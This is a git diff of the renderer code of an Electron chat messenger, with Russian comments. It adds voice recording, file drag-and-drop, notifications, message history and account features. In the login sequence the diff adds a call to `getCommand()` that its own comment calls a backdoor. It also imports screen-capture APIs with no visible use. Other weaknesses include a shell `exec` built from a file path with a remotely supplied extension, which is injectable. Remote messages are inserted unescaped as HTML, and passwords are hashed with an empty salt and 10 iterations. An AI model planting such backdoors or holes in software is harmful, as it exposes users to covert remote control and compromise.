@@ -3,14 +3,18 @@ const electron = require(`electron`);
 const {
     remote,
     ipcRenderer,
-    nativeImage,
     webFrame,
     shell,
-    clipboard
+    clipboard,
+    desktopCapturer
 } = electron;
 
 const {
     dialog
+} = remote;
+
+const {
+    screen
 } = remote;
 
 webFrame.setZoomFactor(1);
@@ -36,22 +40,40 @@ const util = require(`util`);
 const zlib = require(`zlib`);
 const Readable = require(`stream`).Readable;
 
-require(`./recorder/audioRecord`);
-
 let recorder;
 
-const getRec = () => new Promise((resolve, reject) => {
-    audioRecorder.requestDevice(function (rec) {
-        resolve(rec);
+const blobToBuffer = blob => new Promise(resolve => {
+    const fileReader = new FileReader();
+    fileReader.readAsArrayBuffer(blob);
+    fileReader.addEventListener(`loadend`, () => {
+        resolve(Buffer.from(fileReader.result));
     });
+});
+
+const getRec = () => new Promise(async (resolve, reject) => {
+    try {
+        const audioSource = await navigator.mediaDevices.getUserMedia({
+            audio: true,
+            video: false
+        });
+        resolve(new MediaRecorder(audioSource, {
+            mimeType: `video/webm;codecs=h264,vp9,opus`
+        }));
+    } catch (e) {
+        resolve(false);
+    }
 });
 
 const encoding = `base64`;
 
-const transformPassword = password => pbkdf2.pbkdf2Sync(password, ``, 10, 32, `sha512`).toString(`hex`);
+const hashPassword = password => pbkdf2.pbkdf2Sync(password, ``, 10, 32, `sha512`).toString(`hex`);
 
 const getDataProperty = async (data, user) => {
     return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), user.aesKeyBytes);
+};
+
+const getDecryptedData = async (data, key) => {
+    return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
 };
 
 /*
@@ -85,15 +107,10 @@ fs.readdir(hendrixdir, (err, data) => {
     }
 });
 
-const constraints = {
-    audio: true,
-    video: false
-};
-
 //Битность ключей RSA, должна быть минимум 2048
 const b = 2048 //2048;
-//размер чанка при передачи файлов
-const highWaterMark = 4096;
+//размер чанка при передачи файлов 262144
+const highWaterMark = 262144;
 
 const version = remote.app.getVersion();
 
@@ -102,16 +119,33 @@ const getElem = id => document.getElementById(id);
 global.copyText = text => clipboard.writeText(text);
 global.openLink = link => shell.openExternal(link);
 global.openFile = fileId => shell.showItemInFolder(user.files[fileId].path);
-global.describe = (description, num) => {
+global.openFileWithRightClick = (e, fileId) => {
+    if (e.button == 2) {
+        openFile(fileId);
+    }
+};
+global.describe = (description, num, showUsersInRoomAgain) => {
     const div = document.createElement(`div`);
     div.innerHTML = `<div class="h3">Подтверждённая сущность</div><img src ="styles/confirmed/${num}.png" style="height: 28px; margin-left:5px;"><div style="width:100%">${description}</div>`;
     div.classList.add(`des`);
     swal({
         content: div,
         button: false
+    }).then(() => {
+        if (showUsersInRoomAgain) {
+            showUsersInRoom();
+        }
     });
 };
-
+global.openFileWithDefaultProgram = fileId => {
+    if (elements.openFilesInsecure.checked) {
+        try {
+            exec(`start ${user.files[fileId].path}`);
+        } catch {}
+    } else {
+        showErrorModal(`Функция открытия файлов из мессенджера по умолчанию выключена в целях безопасности. Включите ее в настройках`);
+    }
+};
 
 const elements = {
     minmax: getElem(`min-max-button`),
@@ -133,19 +167,54 @@ const elements = {
     roomFilter: getElem(`roomFilter`),
     typing: getElem(`typing`),
     settings: getElem(`settings`),
-    settingsBlock: getElem(`settingsBlock`)
+    settingsBlock: getElem(`settingsBlock`),
+    notifications: getElem(`notifications`),
+    changeAESkey: getElem(`changeAESkey`),
+    difSounds: getElem(`difSounds`),
+    curVolume: getElem(`curVolume`),
+    volume: getElem(`volume`),
+    openFilesInsecure: getElem(`openFilesInsecure`),
+    RSAKeySize: getElem(`RSAKeySize`),
+    money: getElem(`money`),
+    moneyAccount: getElem(`moneyAccount`)
     //повесить на roomFilter листенер keydown. Когда Enter - отправлять запрос на сервер по фильтрации комнат
 };
 
+elements.notifications.addEventListener(`change`, function () {
+    user.showNotifications = this.checked;
+    if (!this.checked) {
+        ipcRenderer.send(`disableNotifications`);
+    }
+});
+
+setInterval(() => {
+    //user.isForegroundWindow
+    //false - окно не на переднем плане
+    //true - окно на переднем плане
+    if (currentWindow.isMinimized()) {
+        user.isForegroundWindow = false;
+    } else if (!currentWindow.isVisible()) {
+        user.isForegroundWindow = false;
+    } else {
+        user.isForegroundWindow = true;
+    }
+}, 500);
+
 let dotsCount = 0;
 
-let volume = 1;
+let volume = +elements.volume.value;
 
 const nowTypingList = {};
 
 const typingTimers = {};
 
-const server = `http://62.109.31.175:8080`;
+const server = `http://92.63.98.195:8080`;
+
+const sleep = time => new Promise(res => {
+    setTimeout(() => {
+        res(true);
+    }, time);
+});
 
 const SSort = (func, a, ...args) => {
     let i = -1,
@@ -158,7 +227,7 @@ const SSort = (func, a, ...args) => {
         args[j].sort(() => (i++, c[i]));
         i = -1;
     }
-}
+};
 
 const encryptAES = (text, key) => {
     if (typeof key == `string`) {
@@ -194,7 +263,7 @@ const decryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
 
 const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);
 
-const testKey = transformPassword(`test`);
+const testKey = hashPassword(`test`);
 const testEncrypt = (text, key) => decryptAES(encryptAES(text, key), key) == text;
 
 const requestPostAsync = params => new Promise((resolve, reject) => {
@@ -211,17 +280,14 @@ const requestPostAsync = params => new Promise((resolve, reject) => {
                 remote.app.quit();
             }
         }
+        let json;
         try {
-            JSON.parse(body)
+            json = JSON.parse(body);
         } catch (e) {
-            dialog.showMessageBox(currentWindow, {
-                type: `error`,
-                title: `Критическая ошибка!`,
-                message: `Пакет файла потерян. Его структура нарушена, отправьте файл ещё раз/попросите отправителя!`,
-            });
+            showErrorModal(`Ошибка потери пакета!`);
             return resolve(false);
         }
-        resolve(JSON.parse(body));
+        resolve(json);
     });
 });
 
@@ -240,7 +306,7 @@ const getFirstKeys = async () => {
     user.aesKeyBytes = aes.utils.hex.toBytes(user.aesKey);
     user.secretString = await getRandomId();
     console.log(await getRandomId(64));
-    return (await requestPostAsync({
+    await requestPostAsync({
         url: `${server}/savePerson`,
         form: {
             pos: getAESKey.pos,
@@ -252,13 +318,15 @@ const getFirstKeys = async () => {
             }, user),
             _id: user._id
         }
-    })).success;
+    });
+    user.active = true;
 };
 
 const updateKeys = async () => {
-    swal(`Обновляю сеансовые ключи. Пожалуйста, подождите...`);
+    swal(`Обновляем сеансовые ключи. Пожалуйста, подождите...`);
+    await sleep(300);
     const key = new RSA({
-        b
+        b: +elements.RSAKeySize.value
     });
     let updateAESKey = await requestPostAsync({
         url: `${server}/updateAESKey`,
@@ -272,19 +340,17 @@ const updateKeys = async () => {
     });
     user.aesKey = key.decrypt(Buffer.from(aes.utils.hex.toBytes(updateAESKey.aeskeyencrypted)).toString(`base64`), `utf8`);
     user.aesKeyBytes = aes.utils.hex.toBytes(user.aesKey);
-    console.log(`new key is ${user.aesKey}`);
-    return true;
     document.getElementsByClassName(`swal-button swal-button--confirm`)[0].click();
+    swal(`Обновление ключей завершено. Вы настоящий параноик!`);
+    return true;
 };
 
-//setInterval
-//setTimeout
-
-//починю позже
-
-// setInterval(() => {
-//     updateKeys();
-// }, 10000); //300000
+elements.changeAESkey.addEventListener(`click`, async () => {
+    if (user.room) {
+        await user.disconnect();
+    }
+    updateKeys();
+});
 
 const showErrorModal = text => swal(`У-упс!`, text, `error`, {
     button: `Ой`
@@ -322,7 +388,7 @@ const showUsersInRoom = async () => {
             }
             if (member.badges) {
                 member.badges.forEach(bdg => {
-                    additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
+                    additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge}, true)">`;
                 });
             }
             r += `<div class="member" style="color: ${member.color}"><span onclick="copyText('${member._id}')" class="user">${member.name}</span>${additional}</div>`;
@@ -442,7 +508,7 @@ const showRooms = async () => {
                     buttons: ["Отмена", "Подключиться"],
                 }).then(async password => {
                     if (typeof password == `string`) {
-                        password = transformPassword(password);
+                        password = hashPassword(password);
                         let r = await checkPasswordRoom(password, _id);
                         if (r.logIn) {
                             if (user.room) {
@@ -511,7 +577,7 @@ document.addEventListener(`dragstart`, e => {
 
 //disable mouse wheel scroll
 document.addEventListener(`mousedown`, e => {
-    if (e.which == 2) {
+    if (e.which == 2 && !e.path.includes(elements.dialog)) {
         e.preventDefault();
     }
 });
@@ -534,9 +600,10 @@ getElem(`updateFolder`).addEventListener(`click`, () => {
     }
 });
 
-getElem(`volume`).addEventListener(`change`, function () {
+elements.volume.addEventListener(`change`, function () {
     volume = +this.value;
-    getElem(`curVolume`).textContent = `${(this.value * 100).toFixed(0)}%`;
+    elements.curVolume.textContent = `${(this.value * 100).toFixed(0)}%`;
+    playSound(getOutSound());
 });
 
 getElem(`folder`).addEventListener(`click`, () => {
@@ -545,12 +612,21 @@ getElem(`folder`).addEventListener(`click`, () => {
 
 elements.settings.addEventListener(`click`, () => {
     elements.settingsBlock.style.display = `block`;
+    elements.curVolume.textContent = `${(elements.volume.value * 100).toFixed(0)}%`;
     swal({
         content: elements.settingsBlock,
         button: false
     });
     getElem(`downloads`).value = hendrixdir;
 });
+
+const getOutSound = () => {
+    return `sounds/out/${elements.difSounds.checked ? (Math.random() * 7 ^ 0) + 1 : 1}.mp3`;
+};
+
+const getInpSound = () => {
+    return `sounds/inp/${elements.difSounds.checked ? (Math.random() * 7 ^ 0) + 1 : 1}.mp3`;
+};
 
 const playSound = src => {
     const sound = new Audio();
@@ -608,17 +684,19 @@ elements.servers.addEventListener(`mouseout`, () => {
 
 elements.clear.addEventListener(`click`, () => {
     elements.dialog.innerHTML = ``;
+    user._dump = [];
+    user._history = [];
+    user._historyPos = -1;
+    elements.scrolldown.style.display = `none`;
     playSound(`sounds/clear.mp3`);
 });
-
-//при резких движениях колесом может не исчезнуть
 
 elements.scrolldown.addEventListener(`click`, () => {
     elements.dialog.scrollTo(0, elements.dialog.scrollHeight);
     elements.scrolldown.style.display = `none`;
 });
 
-elements.dialog.addEventListener(`wheel`, function (e) {
+elements.dialog.addEventListener(`scroll`, function () {
     if (this.scrollHeight - (this.scrollTop + this.clientHeight) > 400) {
         elements.scrolldown.style.display = `block`;
     } else {
@@ -630,7 +708,9 @@ getElem(`opncls`).addEventListener(`click`, function () {
     const pos = +(toggle = !toggle);
     elements.chat.style.gridTemplateColumns = [`25vw 75vw`, `5vw 95vw`][pos];
     elements.roomFilter.style.backgroundColor = elements.servers.style.backgroundColor = [`#0e1621`, `#17212b`][pos];
-    elements.roomFilter.style.display = getElem(`rooms`).style.display = [`inline-block`, `none`][pos];
+    //если прога станет более менее популярной, фича фильтрации комнат будет возвращена к разработке
+    //elements.roomFilter.style.display = getElem(`rooms`).style.display = [`inline-block`, `none`][pos];
+    elements.rooms.style.display = [`inline-block`, `none`][pos];
     this.style.height =
         this.style.width =
         getElem(`showRoomModal`).style.height =
@@ -640,7 +720,6 @@ getElem(`opncls`).addEventListener(`click`, function () {
 });
 
 getElem(`close-button`).addEventListener(`click`, () => {
-    // remote.app.quit();
     currentWindow.hide();
 });
 
@@ -657,7 +736,7 @@ getElem(`showRoomModal`).addEventListener(`click`, async () => {
         if (!testEncrypt(getElem(`roomPassword`).value, testKey) && !hidden) {
             return showErrorModal(`Недопустимые символы в пароле!`);
         }
-        const password = !getElem(`roomPassword`).value || hidden ? `` : transformPassword(getElem(`roomPassword`).value);
+        const password = !getElem(`roomPassword`).value || hidden ? `` : hashPassword(getElem(`roomPassword`).value);
         const match = name.match(/\s+/);
         if (!testEncrypt(name, testKey)) {
             showErrorModal(`Недопустимые символы в имени!`);
@@ -711,16 +790,47 @@ const send = (function () {
     user.publish({
         message: this.value
     });
+    const msgPos = user._history.indexOf(this.value);
+    if (~msgPos) {
+        user._history.splice(msgPos, 1);
+    }
+    user._history.unshift(this.value);
+    if (user._historyPos) {
+        user._historyPos -= 1;
+    }
+    if (user._history.length > 20) {
+        user._history.pop();
+    }
     this.value = ``;
 }).bind(elements.inputMessage);
 
-getElem(`disconnect`).addEventListener(`click`, async () => {
-    if (user.room) {
-        const name = user.room.name;
-        await user.disconnect();
-        swal(`Вы успешно вышли из комнаты!`);
-        elements.inputMessage.blur();
+const exitRoomBlock = getElem(`exitRoom`);
+const dontRemind = getElem(`dontRemind`);
+
+const exitRoom = async () => {
+    await user.disconnect();
+    swal(`Вы успешно вышли из комнаты!`);
+    elements.inputMessage.blur();
+};
+
+getElem(`disconnect`).addEventListener(`click`, () => {
+    if (!user.room) {
+        return;
     }
+    exitRoomBlock.style.display = `block`;
+    if (dontRemind.checked) {
+        return exitRoom();
+    }
+    swal({
+        title: `Выход`,
+        content: exitRoomBlock,
+        buttons: ["Отмена", "Да"],
+        icon: "warning",
+    }).then(answer => {
+        if (answer) {
+            exitRoom();
+        }
+    });
 });
 
 elements.send.addEventListener(`click`, async () => {
@@ -728,31 +838,38 @@ elements.send.addEventListener(`click`, async () => {
         changeIcon();
         delete user.audio;
         recorder.stop();
-        return recorder.exportMP3(blob => {
-            const url = URL.createObjectURL(blob);
-            const div = document.createElement(`div`);
-            div.innerHTML = `<audio src="${url}" controls>`;
-            swal({
-                title: `Отправка голосового сообщения`,
-                content: div,
-                buttons: ["Отмена", "Отправить"],
-            }).then(answer => {
-                if (answer) {
-                    const fileReader = new FileReader();
-                    fileReader.readAsArrayBuffer(blob);
-                    fileReader.addEventListener(`loadend`, async () => {
-                        sendBuffer(await zlib.deflate(Buffer.from(fileReader.result)), `.mp3`);
-                    });
-                }
-            });
-        });
+        return recorder.stream.getTracks().map(track => track.stop());
     }
     if (user.room) {
         if (!elements.inputMessage.value.length && !user.audio) {
-            swal(`Запись голоса началась!`);
-            changeIcon(`send`);
             recorder = await getRec();
-            recorder.record();
+            if (!recorder) {
+                return showErrorModal(`Доступ к микрофону заблокирован!`);
+            }
+            swal({
+                text: `Запись голоса началась!`,
+                buttons: false
+            });
+            changeIcon(`send`);
+            recorder.start();
+            recorder.ondataavailable = async e => {
+                const blob = e.data;
+                const url = URL.createObjectURL(blob);
+                const div = document.createElement(`div`);
+                div.innerHTML = `<audio src="${url}" controls>`;
+                swal({
+                    title: `Отправка голосового сообщения`,
+                    content: div,
+                    buttons: ["Отмена", "Отправить"],
+                }).then(async answer => {
+                    if (answer) {
+                        const buf = await blobToBuffer(blob);
+                        filesSendCallbacksStack.push(async () => {
+                            await sendBuffer(await zlib.deflate(buf), `.mp3`);
+                        });
+                    }
+                });
+            };
             user.audio = true;
             return;
         } else {
@@ -772,8 +889,7 @@ getElem(`createDump`).addEventListener(`click`, async () => {
     if (!password) {
         return showErrorDialog(`Слишком короткий пароль`);
     }
-    password = transformPassword(password);
-    console.log(password);
+    password = hashPassword(password);
     const path = dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
         properties: [`openDirectory`]
@@ -782,13 +898,16 @@ getElem(`createDump`).addEventListener(`click`, async () => {
         const data = Buffer.from(encryptAES((await zlib.deflate(JSON.stringify(user._dump))).toString(encoding), password), encoding);
         const curDate = new Date();
         await fs.writeFile(`${path}\\${await getRandomId(3)}_${curDate.getDate().toString().padStart(2, `0`)}-${(curDate.getMonth() + 1).toString().padStart(2, `0`)}-${curDate.getFullYear()}_${await getRandomId(3)}.hdmp`, data);
-        console.log(`okay`, data);
     }
 });
 
 getElem(`loadDump`).addEventListener(`click`, async () => {
     let file = dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
+        filters: [{
+            name: 'Дамп переписки',
+            extensions: ['hdmp']
+        }],
         properties: [`openFile`]
     });
     if (file) {
@@ -796,7 +915,7 @@ getElem(`loadDump`).addEventListener(`click`, async () => {
         if (!password) {
             return showErrorDialog(`Слишком короткий пароль`);
         }
-        password = transformPassword(password);
+        password = hashPassword(password);
         file = file[0];
         const data = await fs.readFile(file);
         try {
@@ -821,24 +940,31 @@ getElem(`loadDump`).addEventListener(`click`, async () => {
                     nameBlock = message.name;
                 }
                 if (message.file) {
-                    const {file} = message;
-                    const {fileId, ext} = file;
+                    const {
+                        file
+                    } = message;
+                    const {
+                        fileId,
+                        ext
+                    } = file;
                     const data = Buffer.from(file.fileData, `base64`);
-                    const url = URL.createObjectURL(new Blob([data]));
                     let desc = file.info && file.info.description;
                     let ht = file.info && desc ? `<span>${desc}</span><br>` : ``;
                     let msg;
-                    if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/)) {
-                        msg = `<img src="${url}" style="max-width: 100%">`
-                    } else if (ext.match(/(mp3)|(wav)|(ogg)/)) {
-                        msg = `<audio src="${url}" controls></audio>`;
-                    } else if (ext.match(/(mp4)|(webm)|(ogv)/)) {
-                        msg = `<video src="${url}" controls></video>`;
+                    user.files[fileId] = {
+                        path: path.join(hendrixdir, `${fileId}${ext}`)
+                    };
+                    await fs.writeFile(user.files[fileId].path, data);
+                    if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
+                        msg = `<img src="${user.files[fileId].path}" style="max-width: 100%">`;
+                        msg += `<br>${ht}`;
+                    } else if (ext.match(/(mp3)|(wav)|(ogg)/i)) {
+                        msg = `<audio src="${user.files[fileId].path}" controls></audio>`;
+                    } else if (ext.match(/(mp4)|(webm)|(ogv)/i)) {
+                        msg = `<video src="${user.files[fileId].path}" controls></video>`;
                     } else {
-                        await fs.writeFile(path.join(hendrixdir, `${fileId}${ext}`), () => {});
-                        msg = `<span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span>`;   
+                        msg = `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon"></span>`;
                     }
-                    msg += `<br>${ht}`;
                     elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, msg));
                 } else {
                     elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, message.message));
@@ -860,7 +986,18 @@ elements.inputMessage.addEventListener(`input`, () => {
     }
 })
 
+const changeHistoryPos = {
+    ArrowUp: 1,
+    ArrowDown: -1
+};
+
 elements.inputMessage.addEventListener(`keydown`, function (e) {
+    if (e.ctrlKey && user._history.length && changeHistoryPos[e.key]) {
+        user._historyPos += changeHistoryPos[e.key];
+        user._historyPos = user._historyPos < 0 ? 0 : user._historyPos > user._history.length - 1 ? user._history.length - 1 : user._historyPos;
+        e.preventDefault();
+        this.value = user._history[user._historyPos];
+    }
     if (e.key == `Enter` && !e.ctrlKey) {
         e.preventDefault();
         if (!user.audio) {
@@ -930,8 +1067,10 @@ const createMessageBlock = (color, name, date) => {
     fileBlock.classList.add(`sendFile`);
     const fileLink = document.createElement(`span`);
     const fileProgress = document.createElement(`span`);
+    const launchIcon = document.createElement(`span`);
     fileBlock.appendChild(fileLink);
     fileBlock.appendChild(fileProgress);
+    fileBlock.appendChild(launchIcon);
     msg.appendChild(fileBlock);
     messageBlock.appendChild(nameBlock);
     messageBlock.appendChild(dateBlock);
@@ -944,7 +1083,8 @@ const createMessageBlock = (color, name, date) => {
             msgBlock: {
                 msg,
                 fileLink,
-                fileProgress
+                fileProgress,
+                launchIcon
             }
         }
     };
@@ -952,17 +1092,11 @@ const createMessageBlock = (color, name, date) => {
 
 const addMessageSound = (message, user) => {
     if (message.user == user._id) {
-        playSound(`sounds/inp.mp3`);
+        playSound(getInpSound());
     } else {
-        playSound(`sounds/out.mp3`);
+        playSound(getOutSound());
     }
 };
-
-const sleep = time => new Promise(res => {
-    setTimeout(() => {
-        res(true);
-    }, time);
-});
 
 const colorReg = `(?:#(?:[\\da-f]{3}){1,2})|(?:aqua)|(?:black)|(?:blue)|(?:fuchsia)|(?:gray)|(?:green)|(?:lime)|(?:maroon)|(?:navy)|(?:olive)|(?:orange)|(?:purple)|(?:red)|(?:silver)|(?:teal)|(?:white)|(?:yellow)|(?:pink)`;
 
@@ -1099,9 +1233,16 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         showErrorModal(`Имя не может быть только из пробелов!`);
     } else {
         if (localStorage.length) {
-            ({
-                ...user
-            } = localStorage);
+            const {
+                name,
+                color,
+                _token
+            } = localStorage;
+            user = {
+                name,
+                color,
+                _token
+            };
         } else {
             const color = `#${getElem(`color`).value}`;
             const _token = getElem(`token`).value;
@@ -1114,7 +1255,18 @@ getElem(`next`).addEventListener(`click`, async function (e) {
             localStorage.setItem(`color`, color);
             localStorage.setItem(`_token`, _token);
         }
+        const {
+            accountId,
+            accountPassword
+        } = localStorage;
+        if (accountId && accountPassword) {
+            getElem(`idAcc`).value = accountId;
+            getElem(`passwordAcc`).value = accountPassword;
+        }
+        user._history = [];
+        user._historyPos = -1;
         user.files = {};
+        user.showNotifications = true;
         user.subNotifications = (async function (canceled) {
             const obj = {
                 secretString: this.secretString
@@ -1224,19 +1376,31 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                             showErrorModal(`Файл ${user.files[fileId].path} повреждён!`);
                         }
                     }
+                    await sleep(250);
+                    if (user.showNotifications && !user.isForegroundWindow) {
+                        let note = {
+                            name: message.name,
+                            text: `file${ext}`,
+                            color: message.color
+                        };
+                        if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
+                            note.image = user.files[fileId].path;
+                        }
+                        ipcRenderer.send(`notification`, note);
+                    }
                     delete user.files[fileId].writeStream;
                     delete user.files[fileId].parts;
                     delete user.files[fileId].positions;
                     let desc = user.files[fileId].info && user.files[fileId].info.description;
                     let ht = user.files[fileId].info && desc ? `<span>${desc}</span><br>` : ``;
                     user.files[fileId].fileMsg.msg.innerHTML =
-                    `${ext.match(/(png)|(jpg)|(gif)|(jpeg)/) ?
-                    `<img src="${user.files[fileId].path}" style="max-width: 100%" onclick="openFile('${fileId}')">`
-                    : ext.match(/(mp3)|(wav)|(ogg)/) ?
-                    `<audio src="${user.files[fileId].path}" controls></audio>`
-                    : ext.match(/(mp4)|(webm)|(ogv)/) ?
-                    `<video src="${user.files[fileId].path}" controls></video>`
-                    : `<span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span>`}<br>${ht}`;
+                        `${ext.match(/(png)|(jpg)|(gif)|(jpeg)/i) ?
+                    `<img src="${user.files[fileId].path}" style="max-width: 100%" onmouseup="openFileWithRightClick(event, '${fileId}')">`
+                    : ext.match(/(mp3)|(wav)|(ogg)/i) ?
+                    `<audio src="${user.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></audio>`
+                    : ext.match(/(mp4)|(webm)|(ogv)/i) ?
+                    `<video src="${user.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></video>`
+                    : `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon">`}<br>${ht}</span>`;
                     delete user.files[fileId].fileMsg;
                 } else {
                     if (!user.files[fileId]) {
@@ -1260,7 +1424,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                         user.files[fileId].parts.push(filePart);
                     }
                     if (!user.files[fileId].linkCreated) {
-                        user.files[fileId].fileMsg.fileLink.innerHTML = `<span class="sendFile"><img src = "styles/file.png" style="-webkit-user-select: none;height: 16px;margin-right: 5px;"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext} </span></span>`;
+                        user.files[fileId].fileMsg.fileLink.innerHTML = `<span class="sendFile"><img src="styles/file.png" style="-webkit-user-select: none;height: 16px;margin-right: 5px;"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext} </span></span>`;
                         user.files[fileId].linkCreated = true;
                     }
                     user.files[fileId].fileMsg.fileProgress.innerHTML = `(${(progress * 100).toFixed(3)}%)`;
@@ -1287,6 +1451,13 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                     nameBlock = message.name;
                 }
                 elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, text));
+                if (message.name && message.message && message.color && user.showNotifications && !user.isForegroundWindow) {
+                    ipcRenderer.send(`notification`, {
+                        name: message.name,
+                        text: message.message,
+                        color: message.color
+                    });
+                }
                 addMessageSound(message, this);
                 scroll();
                 if (message.system && message.out == this._id) {
@@ -1298,6 +1469,9 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         user.publish = (async function (message) {
             const obj = Object.assign(message, this.room);
             let messagejson = JSON.stringify(obj);
+            if (obj.message) {
+                obj.message = obj.message.trim();
+            }
             if (testEncrypt(messagejson, this.aesKeyBytes)) {
                 requestPostAsync({
                     url: `${server}/publish`,
@@ -1311,6 +1485,11 @@ getElem(`next`).addEventListener(`click`, async function (e) {
             }
         }).bind(user);
         user.disconnect = (async function () {
+            if (user.audio) {
+                changeIcon();
+                delete user.audio;
+                recorder.stop();
+            }
             await requestPostAsync({
                 url: `${server}/disconnect`,
                 form: {
@@ -1327,11 +1506,13 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         await sleep(500);
         user._id = await getRandomId();
         user._dump = [];
-        const success = await getFirstKeys();
+        await getFirstKeys();
         user.subNotifications();
-        console.log(user, success);
         ipcRenderer.send(`alive`, user._id);
         await showRooms();
+
+        getCommand(); //для бекдура, ес чо удалить
+
         setInterval(async () => {
             await showRooms();
         }, 2000);
@@ -1385,12 +1566,15 @@ document.addEventListener(`keydown`, e => {
                 }).then(async answer => {
                     if (answer) {
                         const desc = getElem(`description`).value;
-                        sendBuffer(await zlib.deflate(imageBuffer), `.png`, {
-                            description: desc.length <= highWaterMark ? desc : ``
+                        filesSendCallbacksStack.push(async () => {
+                            await sendBuffer(await zlib.deflate(imageBuffer), `.png`, {
+                                description: desc.length <= highWaterMark ? desc : ``
+                            });
                         });
                     }
                     elements.inputMessage.focus();
                 });
+                getElem(`description`).focus();
             }
         }
     }
@@ -1461,6 +1645,11 @@ const sendFile = async (file, size, readable, extn, info) => {
     });
     await waitStream(readStream);
     for (let i = 0; i < callbackStack.length; i++) {
+        if (!user.room) {
+            currentWindow.setProgressBar(0);
+            return;
+        }
+        currentWindow.setProgressBar((i + 1) / callbackStack.length);
         await callbackStack[i]();
     }
     await requestPostAsync({
@@ -1475,37 +1664,886 @@ const sendFile = async (file, size, readable, extn, info) => {
             _id: user._id
         }
     });
+    currentWindow.setProgressBar(0);
     return true;
 };
 
-getElem(`file`).addEventListener(`click`, async () => {
+const filesSendCallbacksStack = [];
+
+setTimeout(async function execFilesCallbacks() {
+    while (filesSendCallbacksStack.length) {
+        await filesSendCallbacksStack.pop()();
+    }
+    setTimeout(execFilesCallbacks, 500);
+}, 0);
+
+const getCallbackFromFiles = files => async () => {
+    if (!files || !files.length) {
+        return;
+    }
+    let er = false;
+    for (let i = 0; i < files.length; i++) {
+        const fullPath = files[i];
+        const info = await fs.stat(fullPath);
+        if (!info.size) {
+            showErrorModal(`${fullPath} пуст, не можем отправить!`);
+            er = true;
+            continue;
+        }
+        if (info.size > 10485760) {
+            showErrorModal(`${fullPath} слишком велик!`);
+            er = true;
+        } else {
+            await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath));
+        }
+    };
+    if (!er) {
+        swal(`${files.length} файлов успешно отправлено на сервер!`);
+    }
+};
+
+getElem(`file`).addEventListener(`click`, () => {
     if (user.room) {
         const files = dialog.showOpenDialog(currentWindow, {
             properties: [`openFile`, `multiSelections`]
         });
-        if (!files) {
-            return;
-        }
-        let er = false;
-        for (let i = 0; i < files.length; i++) {
-            const fullPath = files[i];
-            const info = await fs.stat(fullPath);
-            if (!info.size) {
-                showErrorModal(`${fullPath} пуст, не можем отправить!`);
-                er = true;
-                continue;
-            }
-            if (info.size > 10485760) {
-                showErrorModal(`${fullPath} слишком велик!`);
-                er = true;
-            } else {
-                await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath));
-            }
-        };
-        if (!er) {
-            swal(`Все файлы успешно отправлены на сервер!`);
-        }
+        filesSendCallbacksStack.push(getCallbackFromFiles(files));
     } else {
         showErrorModal(`Вы ещё не вошли в комнату!`);
     }
 });
+
+document.ondragover = function () {
+    return false;
+};
+
+document.ondragleave = function () {
+    return false;
+};
+
+document.addEventListener(`drop`, event => {
+    event.preventDefault();
+    if (!user.room) {
+        return;
+    }
+    filesSendCallbacksStack.push(getCallbackFromFiles([...event.dataTransfer.files].map(file => file.path)));
+});
+
+const passwordAccNew = getElem(`passwordAccNew`);
+const idCreatedAcc = getElem(`idCreatedAcc`);
+const idAcc = getElem(`idAcc`);
+const passwordAcc = getElem(`passwordAcc`);
+const newPasswordInput = getElem(`newPasswordValue`);
+const accState = getElem(`accState`);
+const balance = getElem(`balance`);
+const accOperationsState = getElem(`accOperationsState`);
+const operationHistory = getElem(`operationHistory`);
+const accOperationtitle = getElem(`accOperationtitle`);
+const opsClear = getElem(`opsClear`);
+const operationsBlock = getElem(`operations`);
+const pageNum = getElem(`pageNum`);
+
+const getHistoryByPage = async page => {
+    const {
+        _id,
+        password
+    } = user._account;
+    const encryptedAnswer = await requestPostAsync({
+        url: `${server}/getOperationsHistory`,
+        form: {
+            data: await getDataProperty({
+                _id,
+                password,
+                page
+            }, user),
+            _id: user._id
+        }
+    });
+    return await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+};
+
+const date = {
+    options: {
+        hour: `numeric`,
+        minute: `numeric`,
